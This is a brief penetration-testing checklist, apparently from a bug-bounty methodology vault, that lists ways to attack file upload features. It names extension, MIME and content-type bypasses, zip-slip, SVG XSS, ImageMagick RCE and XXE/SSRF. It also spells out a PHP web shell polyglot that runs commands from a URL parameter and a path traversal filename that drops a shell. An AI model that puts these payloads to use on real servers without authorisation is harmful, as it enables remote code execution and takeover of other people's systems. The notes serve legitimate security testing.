> [!abstract] Module: [[4-Methodology/Crow-Hustler/hunter-methodology-V1/hunting/00-index|← Back to Hunting]]

# File Upload

## Always Test

- Extension bypass: `.php.jpg`, `.jpg.php`, `.phtml`, `.phar`, `.php5`
- MIME bypass: send wrong MIME but valid code
- Polyglot: `GIF89a;<?php system($_GET['c']); ?>`
- Path traversal in filename: `../../shell.php`
- SVG XSS
- Compression: zip-slip
- S3 bucket path traversal
- Content-Type spoof
- ImageMagick SVG → RCE
- Office files: OOXML macro + XXE + SSRF
